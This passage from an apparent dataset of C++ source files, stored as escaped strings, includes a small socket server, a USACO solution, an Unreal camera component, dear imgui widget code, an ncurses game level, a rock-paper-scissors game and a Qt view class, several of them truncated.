\u0432\u0445\u043e\u0434\u044f\u0449\u0435\u0433\u043e \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f\" << std::endl;\n            exit(1);\n        }\n\n        std::cout << \"\u041a\u043b\u0438\u0435\u043d\u0442 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0435\u043d\" << std::endl;\n    }\n\n    void send_command() {\n        if (send(clientSock, &command, sizeof(command),0) < 0) {\n            std::cerr << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0435 \u0434\u0430\u043d\u043d\u044b\u0445 \u043a\u043b\u0438\u0435\u043d\u0442\u0443\" << std::endl;\n            exit(1);\n        }\n    }\n\n    void recv_command() {\n        if (recv(clientSock, &command, sizeof(command),0)< 0) {\n            std::cerr << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043f\u0440\u0438\u0435\u043c\u0435 \u043a\u043e\u043c\u0430\u043d\u0434\u044b \u043e\u0442 \u043a\u043b\u0438\u0435\u043d\u0442\u0430\" << std::endl;\n            exit(1);\n        }\n\n        std::cout << \"\u041f\u043e\u043b\u0443\u0447\u0435\u043d\u0430 \u043a\u043e\u043c\u0430\u043d\u0434\u0430: \" << command.commandType << std::endl;\n    }\n\n    void StopServer() {\n        shutdown(clientSock, 2);\n        shutdown(serverSock, 2);\n        \n        if (clientSock != -1) {\n            close(clientSock);\n            clientSock = -1;\n        }\n\n        if (serverSock != -1) {\n            close(serverSock);\n            serverSock = -1;\n        }\n    }\n};\n\nint main() {\n    Server server;\n\n    server.StartServer();\n\n    server.send_command();\n    server.recv_command();\n\n    server.StopServer();\n\n    return 0;\n}",
    "#include <bits/stdc++.h>\n\nusing namespace std;\n\nint main()\n{\n    freopen(\"cownomics.in\", \"r\", stdin);\n\n    freopen(\"cownomics.out\", \"w\", stdout);\n\n    int n, m;\n    cin >> n >> m;\n\n    vector<vector<char>> spotty(n, vector<char>(m));\n    vector<vector<char>> plain(n, vector<char>(m));\n\n    vector<set<int>> tempSpotty(m);\n    vector<set<int>> tempPlain(m);\n\n    for (int i = 0; i < n; i++)\n    {\n        for (int j = 0; j < m; j++)\n        {\n            char a;\n            cin >> a;\n            spotty[i][j] = a;\n            tempSpotty[j].insert(a);\n        }\n    }\n\n    for (int i = 0; i < n; i++)\n    {\n        for (int j = 0; j < m; j++)\n        {\n            char a;\n            cin >> a;\n            plain[i][j] = a;\n            tempPlain[j].insert(a);\n        }\n    }\n\n    long long ans = 0;\n\n    for (int i = 0; i < m; i++)\n    {\n        bool matchingOther = false;\n        for (auto c : tempSpotty[i])\n        {\n            if (tempPlain[i].find(c) != tempPlain[i].end())\n            {\n                matchingOther = true;\n                break;\n            }\n        }\n        if (!matchingOther)\n        {\n            ans++;\n        }\n    }\n\n    cout << ans << endl;\n}\n",
    "// Copyright (c) 2024, Marco Silva. All rights reserved.\n\n\n#include \"Components/CameraSmootherComponent.h\"\n\nUCameraSmootherComponent::UCameraSmootherComponent() :\n\tDefaultInterpSpeed(1.0f)\n{\n\tPrimaryComponentTick.bCanEverTick = true;\n\n}\n\nvoid UCameraSmootherComponent::BeginPlay()\n{\n\tSuper::BeginPlay();\n\t\n\t// Gets the camera arm\n\tCameraArm = Cast<USpringArmComponent>(GetOwner()->GetComponentByClass(USpringArmComponent::StaticClass()));\n\tif (CameraArm)\n\t{\n\t\tbActive = true;\n\n\t\t// Enable camera arm lag (lag amount will be controlled by the settings)\n\t\tCameraArm->bEnableCameraLag = true;\n\t\tCameraArm->bEnableCameraRotationLag = true;\n\t}\n\telse bActive = false;\n\n\t// Gets the camera\n\tCamera = Cast<UCameraComponent>(GetOwner()->GetComponentByClass(UCameraComponent::StaticClass()));\n\tif (Camera)\n\t{\n\t\tbActive = true;\n\t}\n\telse bActive = false;\n\n\t// Update with default settings\n\tif (bActive)\n\t{\n\t\tUpdateParams.ShoulderOffset.InterpSpeed = DefaultInterpSpeed;\n\t\tUpdateParams.Distance.InterpSpeed = DefaultInterpSpeed;\n\t\tUpdateParams.TranslationLagSpeed.InterpSpeed = DefaultInterpSpeed;\n\t\tUpdateParams.RotationLagSpeed.InterpSpeed = DefaultInterpSpeed;\n\t\tUpdateParams.FOV.InterpSpeed = DefaultInterpSpeed;\n\n\t\tSetToDefaultValues();\n\t}\n\t\t\n}\n\nvoid UCameraSmootherComponent::TickComponent(float DeltaTime, ELevelTick TickType, FActorComponentTickFunction* ThisTickFunction)\n{\n\tSuper::TickComponent(DeltaTime, TickType, ThisTickFunction);\n\n\tif (!bActive) return;\n\n\t//******************************************************************\n\t// Interpolate setting values\n\t//******************************************************************\n\tCurrentSettings.ShoulderOffset = InterpolateSetting(CurrentSettings.ShoulderOffset, DeltaTime, UpdateParams.ShoulderOffset);\n\tCurrentSettings.Distance = InterpolateSetting(CurrentSettings.Distance, DeltaTime, UpdateParams.Distance);\n\tCurrentSettings.TranslationLagSpeed = InterpolateSetting(CurrentSettings.TranslationLagSpeed, DeltaTime, UpdateParams.TranslationLagSpeed);\n\tCurrentSettings.RotationLagSpeed = InterpolateSetting(CurrentSettings.RotationLagSpeed, DeltaTime, UpdateParams.RotationLagSpeed);\n\tCurrentSettings.FOV = InterpolateSetting(CurrentSettings.FOV, DeltaTime, UpdateParams.FOV);\n\n\t//******************************************************************\n\t// Update camera\n\t//******************************************************************\n\tUpdateCamera(CurrentSettings, false);\n}\n\nvoid UCameraSmootherComponent::UpdateCamera(const FCameraSettings& Settings, bool bForceUpdate)\n{\n\tif (!bActive) return;\n\n\tCurrentSettings = Settings;\n\n\tif (bForceUpdate)\n\t{\n\t\tFCameraSettingUpdateParam ForceParam;\n\t\tForceParam.InterpSpeed = -1.0f;\n\n\t\tForceParam.Value = CalculateShoulderOffset(Settings.ShoulderOffset);\n\t\tUpdateSetting(ForceParam, ECameraSetting::ShoulderOffset);\n\n\t\tForceParam.Value = Settings.Distance;\n\t\tUpdateSetting(ForceParam, ECameraSetting::Distance);\n\n\t\tForceParam.Value = Settings.TranslationLagSpeed;\n\t\tUpdateSetting(ForceParam, ECameraSetting::TranslationLagSpeed);\n\n\t\tForceParam.Value = Settings.RotationLagSpeed;\n\t\tUpdateSetting(ForceParam, ECameraSetting::RotationLagSpeed);\n\n\t\tForceParam.Value = Settings.FOV;\n\t\tUpdateSetting(ForceParam, ECameraSetting::FOV);\n\t}\n\n\t//******************************************************************\n\t// Shoulder Offset\n\t//******************************************************************\n\tCameraArm->SocketOffset.Y = Settings.ShoulderOffset;\n\n\t//******************************************************************\n\t// Distance\n\t//******************************************************************\n\tCameraArm->TargetArmLength = Settings.Distance;\n\n\t//******************************************************************\n\t// Translation Lag Speed\n\t//******************************************************************\n\tCameraArm->CameraLagSpeed = Settings.TranslationLagSpeed;\n\n\t//******************************************************************\n\t// Rotation Lag Speed\n\t//******************************************************************\n\tCameraArm->CameraRotationLagSpeed = Settings.RotationLagSpeed;\n\n\t//******************************************************************\n\t// Field Of View\n\t//******************************************************************\n\tCamera->SetFieldOfView(Settings.FOV);\n}\n\nvoid UCameraSmootherComponent::UpdateSetting(FCameraSettingUpdateParam UpdateParam, ECameraSetting Setting, uint8 CustomSetting)\n{\n\tswitch (Setting)\n\t{\n\tcase ECameraSetting::ShoulderOffset:\n\t\tUpdateParam.Value = CalculateShoulderOffset(UpdateParam.Value);\n\t\tUpdateParams.ShoulderOffset = UpdateParam;\n\t\tPreviousSettings.ShoulderOffset = UpdateParam.Value;\n\t\tbreak;\n\tcase ECameraSetting::Distance:\n\t\tUpdateParams.Distance = UpdateParam;\n\t\tPreviousSettings.Distance = UpdateParam.Value;\n\t\tbreak;\n\tcase ECameraSetting::TranslationLagSpeed:\n\t\tUpdateParams.TranslationLagSpeed = UpdateParam;\n\t\tPreviousSettings.TranslationLagSpeed = UpdateParam.Value;\n\t\tbreak;\n\tcase ECameraSetting::RotationLagSpeed:\n\t\tUpda",
    "// dear imgui, v1.90.8\n// (widgets code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Widgets: Text, etc.\n// [SECTION] Widgets: Main (Button, Image, Checkbox, RadioButton, ProgressBar, Bullet, etc.)\n// [SECTION] Widgets: Low-level Layout helpers (Spacing, Dummy, NewLine, Separator, etc.)\n// [SECTION] Widgets: ComboBox\n// [SECTION] Data Type and Data Formatting Helpers\n// [SECTION] Widgets: DragScalar, DragFloat, DragInt, etc.\n// [SECTION] Widgets: SliderScalar, SliderFloat, SliderInt, etc.\n// [SECTION] Widgets: InputScalar, InputFloat, InputInt, etc.\n// [SECTION] Widgets: InputText, InputTextMultiline\n// [SECTION] Widgets: ColorEdit, ColorPicker, ColorButton, etc.\n// [SECTION] Widgets: TreeNode, CollapsingHeader, etc.\n// [SECTION] Widgets: Selectable\n// [SECTION] Widgets: Typing-Select support\n// [SECTION] Widgets: Multi-Select support\n// [SECTION] Widgets: ListBox\n// [SECTION] Widgets: PlotLines, PlotHistogram\n// [SECTION] Widgets: Value helpers\n// [SECTION] Widgets: MenuItem, BeginMenu, EndMenu, etc.\n// [SECTION] Widgets: BeginTabBar, EndTabBar, etc.\n// [SECTION] Widgets: BeginTabItem, EndTabItem, etc.\n// [SECTION] Widgets: Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_internal.h\"\n\n// System includes\n#include <stdint.h>     // intptr_t\n\n//-------------------------------------------------------------------------\n// Warnings\n//-------------------------------------------------------------------------\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#if defined(_MSC_VER) && _MSC_VER >= 1922 // MSVC 2019 16.2 or later\n#pragma warning (disable: 5054)     // operator '|': deprecated between enumerations of different types\n#endif\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3).\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants (typically 0.0f) is ok.\n#pragma clang diagnostic ignored \"-Wformat-nonliteral\"              // warning: format string is not a string literal            // passing non-literal to vsnformat(). yes, user passing incorrect format strings can crash the code.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wenum-enum-conversion\"           // warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_')\n#pragma clang diagnostic ignored \"-Wdeprecated-enum-enum-conversion\"// warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_') is deprecated\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#pragma clang diagnostic ignored \"-Wunsafe-buffer-usage\"            // warning: 'xxx' is an unsafe pointer used for buffer access\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                          // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wformat-nonliteral\"       ",
    "#include \"Level1.h\"\n\nusing namespace std;\n\n\nLevel1::Level1(int nivo) : rng(static_cast<unsigned int>(std::time(nullptr)))\n{\n\tbossHp = 9;\n\trandomAsserted = false;\n\tdrawEverythingButLevelWin();\n\tdrawLevelWalls();\n\tciklusStvaranjaMetkovaTop = 2;\n\tcount = 0;\n\tswitch (nivo) {\n\tcase 0:\n\t\ttezina = 150;\n\t\tbreak;\n\tcase 1:\n\t\ttezina = 100;\n\t\tbreak;\n\tcase 2:\n\t\ttezina = 50;\n\t\tbreak;\n\tdefault:\n\t\tbreak;\n\n\t}\n\tblinkAmmo = false;\n\tblinkBoss = false;\n\n\t//add player\n\tmvwaddch(levelWindow, p->curLocY, p->curLocX, p->cLook);\n\t//add stones\n\tdrawStones();\n\n\tispuniListuTopova();\n\tispuniListuZmija();\n\tispuniListuDemona();\n\n\n\n\tdrawCannons();\n\tdrawAmmo();\n\tdrawHealth();\n\tdrawCheckpoint();\n\tdrawLevers();\n\tdrawMemFrags();\n\n\ttoInput = true;\n\tlasCheckPointX = 1;\n\tlasCheckPointY = 24;\n\n\tpreviousHealth = p->health;\n\tpreviousAmmo = p->ammo;\n\n\tleverCorridorPulled = false;\n\tbossLeverPulled = false;\n\tlever1Pulled = false;\n\tlever2Pulled = false;\n\tlever3Pulled = false;\n\n\n\n\n\tlevelLoop();\n\n\n\n\n}\n\nvoid Level1::drawMemFrags() {\n\n\twattron(levelWindow, COLOR_PAIR(5));\n\tmvwprintw(levelWindow, 21, 46, \"m\");\n\tmvwprintw(levelWindow, 22, 46, \"m\");\n\tmvwprintw(levelWindow, 23, 46, \"m\");\n\tmvwprintw(levelWindow, 24, 46, \"m\");\n\n\tmvwprintw(levelWindow, 7, 26, \"m\");\n\tmvwprintw(levelWindow, 8, 24, \"m\");\n\tmvwprintw(levelWindow, 8, 28, \"m\");\n\tmvwprintw(levelWindow, 9, 27, \"m\");\n\tmvwprintw(levelWindow, 9, 25, \"m\");\n\n\tmvwprintw(levelWindow, 16, 84, \"m\");\n\tmvwprintw(levelWindow, 17, 83, \"m\");\n\tmvwprintw(levelWindow, 18, 82, \"m\");\n\n\tmvwprintw(levelWindow, 19, 31, \"m\");\n\tmvwprintw(levelWindow, 19, 43, \"m\");\n\n\n\n\n\n\twattroff(levelWindow, COLOR_PAIR(5));\n}\n\nvoid Level1::drawAmmo() {\n\twattron(levelWindow, COLOR_PAIR(8));\n\n\tmvwprintw(levelWindow, 13, 1, \"A\");\n\tmvwprintw(levelWindow, 13, 5, \"A\");\n\n\tmvwprintw(levelWindow, 21, 100, \"A\");\n\tmvwprintw(levelWindow, 21, 107, \"A\");\n\n\tmvwprintw(levelWindow, 24, 100, \"A\");\n\tmvwprintw(levelWindow, 24, 107, \"A\");\n\n\tmvwprintw(levelWindow, 8, 1, \"A\");\n\tmvwprintw(levelWindow, 8, 2, \"A\");\n\tmvwprintw(levelWindow, 9, 1, \"A\");\n\n\n\n\twattroff(levelWindow, COLOR_PAIR(8));\n}\n\nvoid Level1::drawHealth()\n{\n\tchtype h = '+' | COLOR_PAIR(9);\n\n\tmvwaddch(levelWindow, 21, 59, h);\n\tmvwaddch(levelWindow, 14, 3, h);\n\tmvwaddch(levelWindow, 22, 82, h);\n\tmvwaddch(levelWindow, 11, 3, h);\n\tmvwaddch(levelWindow, 15, 104, h);\n\tmvwaddch(levelWindow, 1, 18, h);\n\tmvwaddch(levelWindow, 18, 63, h);\n\tmvwaddch(levelWindow, 10, 53, h);\n\tmvwaddch(levelWindow, 7, 70, h);\n\n\n\n}\n\nvoid Level1::drawCheckpoint() {\n\n\twattron(levelWindow, COLOR_PAIR(7));\n\tmvwprintw(levelWindow, 23, 63, \"C\");\n\tmvwprintw(levelWindow, 14, 87, \"C\");\n\tmvwprintw(levelWindow, 17, 19, \"C\");\n\tmvwprintw(levelWindow, 24, 88, \"C\");\n\n\n\n\twattroff(levelWindow, COLOR_PAIR(7));\n\n}\n\nvoid Level1::drawLevers()\n{\n\twattron(levelWindow, COLOR_PAIR(6));\n\t//corridorLever\n\tmvwprintw(levelWindow, 17, 37, \"l\");\n\t//1\n\tmvwprintw(levelWindow, 24, 115, \"l\");\n\t//2\n\tmvwprintw(levelWindow, 19, 19, \"l\");\n\t//3\n\tmvwprintw(levelWindow, 1, 7, \"l\");\n\twattroff(levelWindow, COLOR_PAIR(6));\n\n\n}\n\nvoid Level1::checkLevers()\n{\n\t//100663404 == lever\n\n\n\tint leverCorridorLoc = mvwinch(levelWindow, 17, 37);\n\n\tif (leverCorridorLoc != 100663404 && !leverCorridorPulled) {\n\t\tcorridorTrap();\n\t\tleverCorridorPulled = true;\n\t}\n\tint bossLeverLoc = mvwinch(levelWindow, 1, 37);\n\n\tif (bossLeverLoc != 100663404 && !bossLeverPulled && leverCorridorPulled) {\n\t\tbossLeverPulled = true;\n\t\tremoveWallsBoss();\n\n\t}\n\tint lever1Loc = mvwinch(levelWindow, 24, 115);\n\n\tif (lever1Loc != 100663404 && !lever1Pulled) {\n\t\tpullLever1();\n\t\tlever1Pulled = true;\n\n\t}\n\tint lever2Loc = mvwinch(levelWindow, 19, 19);\n\n\tif (lever2Loc != 100663404 && !lever2Pulled) {\n\t\tpullLever2();\n\t\tlever2Pulled = true;\n\t}\n\tint lever3Loc = mvwinch(levelWindow, 1, 7);\n\n\tif (lever3Loc != 100663404 && !lever3Pulled) {\n\t\tpullLever3();\n\t\tlever3Pulled = true;\n\n\t}\n\n}\n\nvoid Level1::reDrawEntities() {\n\n\tupdateCannons();\n\n\tupdateZmije();\n\n\tupdateDemons();\n\n\tupdateBullets();\n\n\n\twrefresh(levelWindow);\n\tupdateMemoryLeakInfoBox();\n}\n\nvoid Level1::updateCannons() {\n\n\n\tif (count != ciklusStvaranjaMetkovaTop) {\n\t\tcount++;\n\t\treturn;\n\t}\n\tcount = 0;\n\n\tfor (Top& t : listaTopova) {\n\n\t\tstd::uniform_int_distribution<int> dist(0, 999);\n\t\tint rr = dist(rng);\n\n\t\tif (rr > 300) {\n\t\t\tcontinue;\n\t\t}\n\t\tint tempX = t.curLocX;\n\t\tint tempY = t.curLocY;\n\n\n\n\t\tlistaMetkova.emplace_back(new Bullet(tempY, tempX, t.facingDirection));\n\t}\n\n}\n\nvoid Level1::drawStones() {\n\n\n\tmvwaddch(levelWindow, 21, 60, cLookStena);\n\tmvwaddch(levelWindow, 21, 58, cLookStena);\n\n\n\tmvwaddch(levelWindow, 23, 8, cLookStena);\n\tmvwaddch(levelWindow, 24, 2, cLookStena);\n\tmvwaddch(levelWindow, 24, 20, cLookStena);\n\tmvwaddch(levelWindow, 22, 30, cLookStena);\n\tmvwaddch(levelWindow, 22, 31, cLookStena);\n\tmvwaddch(levelWindow, 23, 30, cLookStena);\n\tmvwaddch(levelWindow, 21, 33, cLookStena);\n\tmvwaddch(levelWindow, 23, 33, cLookStena);\n\tmvwaddch(levelWindow, 22, 35, cLookStena);\n\tmvwaddch(levelWindow, 22, 36, cLookStena);\n\tmvwaddch(levelWindow, 22, 37, cLookStena);\n\tmvwaddch(levelWindow, ",
    "#include <iostream>\n#include <cstdlib>\n\nusing namespace std;\n\nenum enGameChoice\n{\n    Stone = 1,\n    Paper = 2,\n    Scissors = 3\n};\n\nenum enWinner\n{\n    Player1 = 1,\n    Computer = 2,\n    Draw = 3\n};\n\nstruct stRoundInfo\n{\n    short RoundNumber = 0;\n    enGameChoice PlayerChoice;\n    enGameChoice ComputerChoice;\n    enWinner Winner;\n    string WinnerName;\n};\n\nstruct stGameResult\n{\n    short TotalRounds = 0;\n    short Player1WinTimes = 0;\n    short Computer2WinTimes = 0;\n    short Drawtimes = 0;\n    enWinner GameWinner;\n    string WinnerName = \"\";\n};\n\nint RandomNumber(int From, int To)\n{\n    int randNum = rand() % (To - From + 1) + From;\n    return randNum;\n}\n\nstring WinnerName(enWinner Winner)\n{\n    /* if (Winner == enWinner::Computer)\n     {\n         return \"Computer\";\n     }\n     else if (Winner == enWinner::Player1)\n     {\n         return \"Player1\";\n     }\n     else\n         return \"Draw\";*/\n\n    string arrWinnerName[3] = {\"Player1\", \"Computer\", \"Draw\"};\n    return arrWinnerName[Winner - 1];\n}\n\nenWinner WhoWonTheRound(stRoundInfo RoundInfo)\n{\n    if (RoundInfo.PlayerChoice == RoundInfo.ComputerChoice)\n    {\n        return enWinner::Draw;\n    }\n\n    switch (RoundInfo.PlayerChoice)\n    {\n    case enGameChoice::Stone:\n        if (RoundInfo.ComputerChoice == enGameChoice::Paper)\n        {\n            return enWinner::Computer;\n        }\n        break;\n\n    case enGameChoice::Paper:\n        if (RoundInfo.ComputerChoice == enGameChoice::Scissors)\n        {\n            return enWinner::Computer;\n        }\n        break;\n    case enGameChoice::Scissors:\n        if (RoundInfo.ComputerChoice == enGameChoice::Stone)\n        {\n            return enWinner::Computer;\n        }\n        break;\n    }\n    return enWinner::Player1;\n}\n\nstring ChoiceName(enGameChoice Choice)\n{\n    string arrChoiceName[3] = {\"Stone\", \"Paper\", \"Scissors\"};\n    return arrChoiceName[Choice - 1];\n}\n\nvoid SetWinnerScreenColor(enWinner Winner)\n{\n    if (WinnerName(Winner) == \"Computer\")\n        system(\"color 4F\");\n    else if (WinnerName(Winner) == \"Player1\")\n        system(\"color 2F\");\n    else\n        system(\"color 6F\");\n}\n\nvoid PrintRoundResluts(stRoundInfo RoundInfo)\n{\n    cout << \"\\n____________Round[\" << RoundInfo.RoundNumber << \"] ___________\\n\\n\";\n    cout << \"Player1 Choice : \" << ChoiceName(RoundInfo.PlayerChoice) << endl;\n    cout << \"Computer Choice: \" << ChoiceName(RoundInfo.ComputerChoice) << endl;\n    cout << \"Round Winner   : [\" << RoundInfo.WinnerName << \"] \\n\";\n    cout << \"___________________________________________________________\\n\"\n         << endl;\n\n    SetWinnerScreenColor(RoundInfo.Winner);\n}\n\nenWinner WhoWonTheGame(short Player1WinTimes, short ComputerWinTimes)\n{\n    if (Player1WinTimes > ComputerWinTimes)\n        return enWinner::Player1;\n    else if (Player1WinTimes < ComputerWinTimes)\n        return enWinner::Computer;\n    else\n        return enWinner::Draw;\n}\n\nstGameResult FillGameResult(int GameRounds, short Player1WinTimes, short ComputerWinTimes, short DrawTimes)\n{\n    stGameResult GameResults;\n\n    GameResults.TotalRounds = GameRounds;\n    GameResults.Player1WinTimes = Player1WinTimes;\n    GameResults.Computer2WinTimes = ComputerWinTimes;\n    GameResults.Drawtimes = DrawTimes;\n    GameResults.GameWinner = WhoWonTheGame(Player1WinTimes, ComputerWinTimes);\n    GameResults.WinnerName = WinnerName(GameResults.GameWinner);\n    return GameResults;\n}\n\nenGameChoice ReadPlayer1Choice()\n{\n    short choice = 1;\n    do\n    {\n        cout << \"\\nYour choice: [1]:Stone, [2]:Paper, [3]:Scissors ? \";\n        cin >> choice;\n    } while (choice < 1 || choice > 3);\n    return (enGameChoice)choice;\n}\n\nenGameChoice GetComputerChoice()\n{\n    short choice = RandomNumber(1, 3);\n    return (enGameChoice)choice;\n}\n\nstGameResult PlayGame(short HowManyRounds)\n{\n    stRoundInfo RoundInfo;\n    short Player1WinTimes = 0, ComputerWinTimes = 0, DrawTimes = 0;\n    for (short GameRound = 1; GameRound <= HowManyRounds; GameRound++)\n    {\n        cout << \"\\nRound [\" << GameRound << \"] begins:\\n\";\n        RoundInfo.RoundNumber = GameRound;\n        RoundInfo.ComputerChoice = GetComputerChoice();\n        RoundInfo.PlayerChoice = ReadPlayer1Choice();\n        RoundInfo.Winner = WhoWonTheRound(RoundInfo);\n        RoundInfo.WinnerName = WinnerName(RoundInfo.Winner);\n\n        if (RoundInfo.Winner == enWinner::Player1)\n            Player1WinTimes++;\n        else if (RoundInfo.Winner == enWinner::Computer)\n            ComputerWinTimes++;\n        else if (RoundInfo.Winner == enWinner::Draw)\n            DrawTimes++;\n\n        PrintRoundResluts(RoundInfo);\n    }\n    return FillGameResult(HowManyRounds, Player1WinTimes, ComputerWinTimes, DrawTimes);\n}\n\nstring Tabs(short NumberOfTabs)\n{\n    string t = \"\";\n    for (int i = 0; i < NumberOfTabs; i++)\n    {\n        t += \"\\t\";\n    }\n    return t;\n}\n\nvoid ShowGameOverScreen()\n{\n    cout << Tabs(2) << \"_____________________________________________________\\n\\n\";\n    cout << Tabs(2) << \"                +++ G a m e   O v e r +++",
    "#include \"mainview.h\"\r\n\r\n#include <QDebug>\r\n\r\nQColor MainView::gXYLineColor = QColor(0,255,255);\r\n\r\nMainView::MainView(QWidget *parent)\r\n    : QGraphicsView(parent)\r\n    , IS_MOVE(false)\r\n{\r\n    init();\r\n}\r\n\r\nMainView::MainView(QGraphicsScene *scene, QWidget *parent)\r\n    : QGraphicsView(parent)\r\n    , IS_MOVE(false)\r\n{\r\n    this->setScene(scene);\r\n    init();\r\n}\r\n\r\nvoid MainView::init()\r\n{\r\n    //\u8bbe\u7f6e\u6e32\u67d3\u9009\u9879\uff1a\u6297\u952f\u9f7f\uff0c\u5e73\u6ed1\u50cf\u7d20\u53d8\u6362\uff0c\u6587\u672c\u6297\u952f\u9f7f\uff0c\u65e0\u635f\u56fe\u50cf\u6e32\u67d3\r\n    this->setRenderHints(QPainter::Antialiasing |\r\n                         QPainter::SmoothPixmapTransform |\r\n                         QPainter::TextAntialiasing |\r\n                         QPainter::LosslessImageRendering);\r\n    //\u8bbe\u7f6e\u5750\u6807\u53d8\u6362\u7684\u951a\u70b9\u4e3a\u9f20\u6807\u4f4d\u7f6e\r\n    this->setTransformationAnchor(QGraphicsView::AnchorUnderMouse);\r\n    //\u8bbe\u7f6e\u89c6\u56fe\u66f4\u65b0\u6a21\u5f0f\u4e3a\u5168\u89c6\u56fe\u66f4\u65b0\u6a21\u5f0f\r\n    //\u89c6\u56fe\u4e2d\u4efb\u610f\u90e8\u5206\u53d1\u751f\u53d8\u5316\uff0c\u6574\u4e2a\u89c6\u56fe\u90fd\u4f1a\u8fdb\u884c\u66f4\u65b0\r\n    this->setViewportUpdateMode(QGraphicsView::FullViewportUpdate);\r\n    //\u7981\u7528\u6eda\u52a8\u6761\r\n    this->setHorizontalScrollBarPolicy(Qt::ScrollBarAlwaysOff);\r\n    this->setVerticalScrollBarPolicy(Qt::ScrollBarAlwaysOff);\r\n    //\u8bbe\u7f6e\u53ef\u4ee5\u4f7f\u7528\u9f20\u6807\u62d6\u52a8\u4e00\u4e2a\u77e9\u5f62\u6765\u9009\u62e9\u56fe\u5f62\u9879\r\n    this->setDragMode(QGraphicsView::RubberBandDrag);\r\n    //\u8bbe\u7f6e\u4e86\u4e0a\u4e0b\u6587\u83dc\u5355\u7b56\u7565\u4e3a\u81ea\u5b9a\u4e49\u4e0a\u4e0b\u6587\u83dc\u5355\r\n    this->setContextMenuPolicy(Qt::CustomContextMenu);\r\n\r\n}\r\n\r\nvoid MainView::setMagnify()\r\n{\r\n    scale(1.1,1.1);\r\n}\r\n\r\nvoid MainView::setReduce()\r\n{\r\n    scale(0.9,0.9);\r\n}\r\n\r\nvoid MainView::mouseMoveEvent(QMouseEvent *event)\r\n{\r\n    emit viewPosChange(mapToScene(event->pos()));\r\n\r\n    if(event->buttons() == Qt::MiddleButton && IS_MOVE){\r\n        //\u8bbe\u7f6e\u65b0\u7684\u4e2d\u5fc3\u70b9\uff0c\u5b9e\u73b0\u89c6\u56fe\u79fb\u52a8\u6548\u679c\r\n\r\n        this->setCursor(Qt::ClosedHandCursor);\r\n\r\n        QPointF posOffset = event->pos() - mLastPoint;\r\n        mLastPoint = event->pos();\r\n\r\n        int w = viewport()->rect().width() / 2;\r\n        int h = viewport()->rect().height() / 2;\r\n\r\n        QPoint newCenter(w - posOffset.x() + 0.5, h - posOffset.y() + 0.5);\r\n        centerOn(mapToScene(newCenter));\r\n\r\n        this->scene()->update();\r\n    }\r\n    else{\r\n        QGraphicsView::mouseMoveEvent(event);\r\n    }\r\n}\r\n\r\nvoid MainView::mousePressEvent(QMouseEvent *event)\r\n{\r\n    if(event->buttons() == Qt::MiddleButton){\r\n        mLastPoint = event->pos();\r\n        IS_MOVE = true;\r\n        this->setCursor(Qt::OpenHandCursor);\r\n    }\r\n    else{\r\n        QGraphicsView::mousePressEvent(event);\r\n    }\r\n}\r\n\r\n\r\n\r\nvoid MainView::mouseReleaseEvent(QMouseEvent *event)\r\n{\r\n    this->setCursor(Qt::ArrowCursor);\r\n    if(event->buttons() == Qt::MiddleButton){\r\n        IS_MOVE = false;\r\n    }\r\n    else{\r\n        QGraphicsView::mouseReleaseEvent(event);\r\n    }\r\n}\r\n\r\nvoid MainView::wheelEvent(QWheelEvent *event)\r\n{\r\n    qDebug() << \"wheel\";\r\n    event->angleDelta().y() > 0 ? scale(1.1, 1.1) : scale(0.9, 0.9);\r\n}\r\n",
